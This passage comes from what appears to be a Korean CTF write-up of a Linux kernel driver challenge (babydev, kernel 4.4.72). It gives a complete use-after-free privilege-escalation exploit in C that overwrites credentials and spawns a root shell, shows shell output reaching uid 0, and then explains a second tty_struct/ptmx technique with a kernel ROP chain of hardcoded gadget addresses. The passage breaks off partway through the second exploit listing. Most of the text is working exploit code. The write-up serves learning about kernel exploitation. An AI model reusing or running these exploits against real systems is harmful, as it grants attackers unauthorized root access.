class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> baby1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> baby2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(baby1, <span class="number">65537</span>, <span class="number">168</span>);</span><br><span class="line">    close(baby1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERROR"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> fake_cred[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        write(baby2, fake_cred, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(baby2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exploit을 다 작성했으면 -static 옵션으로 정적 컴파일해서, 환경 설정 과정에서 <code>rootfs.cpio</code> 파일 시스템의 압축을 풀었던 디렉토리에 옮긴 뒤에</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure><p>위 명령어로 압축하면 새로운 <code>roofts.cpio</code> 파일이 나오는데 이 <code>rootfs.cpio</code> 파일을 이용해서 qemu를 실행하시면 해당 exploit 파일이 qemu 내부로 들어간 것을 확인할 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Boot took 0.98 seconds</span><br><span class="line"></span><br><span class="line">/ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">/ $ ./exp</span><br><span class="line">[    7.694453] device open</span><br><span class="line">[    7.696076] device open</span><br><span class="line">[    7.697377] alloc <span class="keyword">done</span></span><br><span class="line">[    7.699022] device release</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><hr></p><h2 id="struct-tty-struct-exploit"><a href="#struct-tty-struct-exploit" class="headerlink" title="struct tty_struct exploit"></a>struct tty_struct exploit</h2><p><code>strcut tty_struct</code>를 이용한 exploit 과정을 간단히 설명하자면 다음과 같습니다.</p><ol><li><code>trap frame</code>을 구성하기 위해 유저 공간의 레지스터들을 저장합니다.</li><li><code>rop palyoad</code>와 가짜 <code>tty_operations</code>을 구성합니다.</li><li>디바이스 를 두 번 <code>open()</code>합니다. (<code>baby1</code>, <code>baby2</code>)</li><li><code>baby1</code> file descriptor에서 <code>babyioctl()</code> 함수를 이용해 <code>struct tty_struct</code>의 크기인 736byte 만큼의 heap을 할당합니다.</li><li><code>baby1</code>를 <code>close()</code>하여 <code>babyrelease()</code> 함수를 호출해 할당된 heap을 해제합니다. 여기서 heap 영역을 해제한 뒤 해당 주소를 저장한 구조체 멤버를 초기화하지 않아 <code>dangling pointer</code>가 발생합니다.</li><li><code>ptmx</code> 디바이스를 <code>open()</code>합니다.</li><li><code>baby2</code>를 이용하여 <code>ptmx</code> 디바이스의 <code>tty_struct</code> 를 유저 공간으로 받아와 <code>const struct tty_operations *ops;</code> 멤버를 우리가 생성한 가짜 <code>tty_operations</code>으로 덮습니다.</li><li>이렇게 만든 가짜 <code>tty_struct</code>를 <code>dangling pointer</code>를 이용하여 <code>ptmx</code>의 <code>struct tty_struct</code>가 있는 heap 영역에 덮어씁니다.</li><li><code>ptmx</code> 디바이스를 <code>write()</code> 함수로 호출하면 <code>fake tty_struct</code> -&gt; <code>fake tty_operations</code> -&gt; <code>rop payload</code> 순으로 호출되면서 root 권한을 획득하게 됩니다.</li></ol><p>문제 커널 버전인 <code>linux kernel v4.4.72</code>의 소스 코드를 보며 exploit 원리를 설명하겠습니다.</p><h5 id="tty-operations"><a href="#tty-operations" class="headerlink" title="tty_operations"></a>tty_operations</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"><span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line"><span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line"><span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br></pre></td></tr></table></figure><p><code>tty_operations</code> 구조체는 <code>&lt;linux/tty_drive.h&gt;</code> 헤더 파일에 선언되어 있습니다.<br>일종의 <code>file_operations</code>으로 <code>ptmx</code> 등의 디바이스에 대한 함수 포인터를 모아둔 구조체입니다.</p><p>예를 들어 <code>ptmx</code> 디바이스의 <code>tty_operations</code>에서 <code>.write = test_wrtie</code>  선언을 해두면, <code>ptmx</code> 디바이스에 대한 <code>wrtie()</code> 함수를 호출할 경우에 내부적으로 구현한 <code>test_write()</code> 함수가 호출되는 것입니다.</p><h5 id="ptmx-open"><a href="#ptmx-open" class="headerlink" title="ptmx_open()"></a>ptmx_open()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ptmx_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pts_fs_info</span> *<span class="title">fsi</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">slave_inode</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">nonseekable_open(inode, filp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We refuse fsnotify events on ptmx, since it's a shared resource */</span></span><br><span class="line">filp-&gt;f_mode |= FMODE_NONOTIFY;</span><br><span class="line"></span><br><span class="line">retval = tty_alloc_file(filp);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">fsi = devpts_get_ref(inode, filp);</span><br><span class="line">retval = -ENODEV;</span><br><span class="line"><span class="keyword">if</span> (!fsi)</span><br><span class="line"><span class="keyword">goto</span> out_free_file;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* find a device that is not in use. */</span></span><br><span class="line">mutex_lock(&amp;devpts_mutex);</span><br><span class="line">index = devpts_new_index(fsi);</span><br><span class="line">mutex_unlock(&amp;devpts_mutex);</span><br><span class="line"></span><br><span class="line">retval = index;</span><br><span class="line"><span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_put_ref;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;tty_mutex);</span><br><span class="line">tty = tty_init_dev(ptm_driver, index);   <span class="comment">// here</span></span><br><span class="line"><span class="comment">/* The tty returned here is locked so we can safely</span></span><br><span class="line"><span class="comment">   drop the mutex */</span></span><br><span class="line">mutex_unlock(&amp;tty_mutex);</span><br></pre></td></tr></table></figure><p>위 코드는 <code>pty.c</code>에 정의된, <code>ptmx</code> 디바이스를 <code>open()</code>할 때 호출되는 <code>ptmx_open()</code> 함수의 도입 부분입니다.<br>소스를 살펴보면 <code>tty_init_dev()</code> 함수를 호출하는 것을 확인할 수 있습니다.</p><h5 id="tty-init-dev"><a href="#tty-init-dev" class="headerlink" title="tty_init_dev()"></a>tty_init_dev()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">tty_init_dev</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * First time open is complex, especially for PTY devices.</span></span><br><span class="line"><span class="comment"> * This code guarantees that either everything succeeds and the</span></span><br><span class="line"><span class="comment"> * TTY is ready for operation, or else the table slots are vacated</span></span><br><span class="line"><span class="comment"> * and the allocated memory released.  (Except that the termios</span></span><br><span class="line"><span class="comment"> * and locked termios may be retained.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(driver-&gt;owner))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENODEV);</span><br><span class="line"></span><br><span class="line">tty = alloc_tty_struct(driver, idx);</span><br><span class="line"><span class="keyword">if</span> (!tty) &#123;</span><br><span class="line">retval = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_module_put;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드는 <code>tty_io.c</code>에 정의된 <code>tty_init_dev()</code> 함수의 도입 부분입니다.<br>코드를 보면 <code>alloc_tty_struct()</code> 함수를 호출하는 것을 볼 수 있습니다.</p><h5 id="alloc-tty-struct"><a href="#alloc-tty-struct" class="headerlink" title="alloc_tty_struct()"></a>alloc_tty_struct()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">alloc_tty_struct</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"></span><br><span class="line">tty = kzalloc(<span class="keyword">sizeof</span>(*tty), GFP_KERNEL);   <span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (!tty)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>위 코드 또한 <code>tty_io.c</code>에 정의된 <code>alloc_tty_struct()</code> 함수의 도입 부분입니다.<br>코드를 보면 <code>kzalloc()</code>함수를 호출하는 것을 볼 수 있습니다.</p><p>즉, <code>ptmx</code> 디바이스를 <code>open</code>하면 <code>tty_struct</code> 를 <strong>heap 영역에 할당한다</strong> 는 것을 알 수 있습니다.</p><h5 id="struct-tty-struct"><a href="#struct-tty-struct" class="headerlink" title="struct tty_struct"></a>struct tty_struct</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span>magic;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">int</span> index;</span><br></pre></td></tr></table></figure><p>위 코드는 <code>&lt;linux/tty.h&gt;</code> 헤더 파일에 선언된 <code>tty_struct</code>의 일부분입니다.<br><code>*ops;</code> 멤버가 <code>const struct tty_operations</code> 형인 것을 알 수 있습니다.</p><p><code>ptmx</code> 디바이스를 <code>open</code> 했을 때 <code>tty_struct</code>가 heap 영역에 할당되고 해당 부분은 uaf 취약점을 이용해 값을 덮어 쓸 수 있으므로 이 <code>*ops</code> 멤버를 가짜 <code>tty_operations</code>로 덮어쓴 뒤 <code>ptmx</code>의 특정 함수를 호출할 경우 우리가 원하는 주소가 실행됩니다.</p><h5 id="fake-tty-operations"><a href="#fake-tty-operations" class="headerlink" title="fake tty_operations"></a>fake tty_operations</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;   <span class="comment">// pop rax; ret;</span></span><br><span class="line">tty_operations[<span class="number">1</span>] = &amp;rop;</span><br><span class="line">tty_operations[<span class="number">2</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br><span class="line">tty_operations[<span class="number">7</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br></pre></td></tr></table></figure><p>위 코드는 exploit에서 사용할 가짜 <code>tty_operations</code> 입니다.<br>이 <code>tty_operations</code>를 가짜 <code>tty_struct</code>의 4번째 멤버에 덮어 씌운 뒤 <code>ptmx</code> 드라이버를 인자로 <code>write()</code>함수를 호출하게 되면 tty_operations[7]의 주소가 호출되고 총 두 번의 <code>stack pivoting</code>을 통해 <code>rop</code>가 실행됩니다.</p><p>해당 payload를 이해하기 쉽도록 어셈으로 표현하면</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rax == &amp;tty_operatins</span><br><span class="line"></span><br><span class="line">mov   rsp, rax    // tty_operations[7], stack pivoting</span><br><span class="line">dec   dex</span><br><span class="line">jmp   &amp;ret</span><br><span class="line">ret</span><br><span class="line">pop   rax         // tty_operations[0], rax == &amp;rop</span><br><span class="line">ret</span><br><span class="line">mov   rsp, rax    // tty_operations[2], stack pivoting</span><br><span class="line">dec   ebx</span><br><span class="line">jmp   &amp;ret</span><br><span class="line">ret</span><br><span class="line">&amp;rop              // tty_operations[1]</span><br></pre></td></tr></table></figure><p>위와 같습니다. rax에 우리가 만든 가짜 <code>tty_operations</code>의 주소가 저장된 상태에서 두 번의 <code>mov  rsp, rax</code>로 인해 두 번의 <code>stack pivoting</code>이 일어납니다.<br>첫 번째 pivoting은 <code>tty_operations</code>, 두 번째 pivoting은 <code>rop</code>를 향해 진행됩니다.</p><h5 id="rop-payload"><a href="#rop-payload" class="headerlink" title="rop payload"></a>rop payload</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rop[<span class="number">0</span>] = <span class="number">0xffffffff810d238d</span>;   <span class="comment">// pop rdi; ret;</span></span><br><span class="line">rop[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">2</span>] = prepare_kernel_cred;</span><br><span class="line">rop[<span class="number">3</span>] = <span class="number">0xffffffff810676e5</span>;   <span class="comment">// pop rdx; pop rcx; ret</span></span><br><span class="line">rop[<span class="number">4</span>] = commit_creds;</span><br><span class="line">rop[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">6</span>] = <span class="number">0xffffffff8180c4a2</span>;   <span class="comment">// mov rdi, rax; call rdx;</span></span><br><span class="line">rop[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">8</span>] = <span class="number">0xffffffff81063694</span>;   <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">rop[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">10</span>]= <span class="number">0xffffffff814e35ef</span>;   <span class="comment">// iretq; ret;</span></span><br><span class="line">rop[<span class="number">11</span>]= &amp;shell;</span><br><span class="line">rop[<span class="number">12</span>]= rv.user_cs;</span><br><span class="line">rop[<span class="number">13</span>]= rv.user_rflags;</span><br><span class="line">rop[<span class="number">14</span>]= rv.user_rsp;</span><br><span class="line">rop[<span class="number">15</span>]= rv.user_ss;</span><br></pre></td></tr></table></figure><p><code>rop payload</code>는 위와 같습니다.</p><p>간단히 코드로 보면</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>위와 같습니다.</p><p><code>rop</code>에 사용할 가젯들은 환경 설정에서 구한 <code>vmlinux</code> 파일을 통해 구할 수 있습니다.</p><p><code>kernel rop</code>에 대해서는 별도의 글에서 구체적으로 다뤄보도록 하겠습니다.</p><h5 id="exploit-code-1"><a href="#exploit-code-1" class="headerlink" title="exploit code"></a>exploit code</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* tty_operations[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">register_val</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> user_rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_rflags;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">register_val</span> <span class="title">rv</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backup_rv</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov rv+8, cs;"</span></span><br><span class="line">        <span class="string">"pushf; pop rv+16;"</span></span><br><span class="line">        <span class="string">"mov rv+24, rsp;"</span></span><br><span class="line">        <span class="string">"mov rv+32, ss;"</span></span><br><span class="line">       );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> trig[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    backup_rv();</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">0</span>] = <span class="number">0xffffffff810d238d</span>;   <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">2</span>] = prepare_kernel_cred;</span><br><span class="line">    rop[<span class="number">3</span>] = <span class="number">0xffffffff810676e5</span>;   <span class="comment">// pop rdx; pop rcx; ret</span></span><br><span class="line">    rop[<span class="number">4</span>] = commit_creds;</span><br><span class="line">    rop[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">6</span>] = <span class="number">0xffffffff8180c4a2</span>;   <span class="comment">// mov rdi, rax; call rdx;</span></span><br><span class="line">    rop[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">8</span>] = <span class="number">0xffffffff81063694</span>;   <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">10</span>]= <span class="number">0xffffffff814e35ef</span>;   <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">11</span>]= &amp;shell;</span><br><span class="line">    rop[<span class="number">12</span>]= rv.user_cs;</span><br><span class="line">    rop[<span class="number">13</span>]= rv.user_rflags;</span><br><span class="line">    rop[<span class="number">14</span>]= rv.user_rsp;</span><br><span class="line">    rop[<span class="number">15</span>]= rv.user_ss;</span><br><span class="line"></span><br><span class="line">    tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;   <span class="comment">// pop rax; ret;</span></span><br><span class="line">    tty_operations[<span class="number">1</span>] = 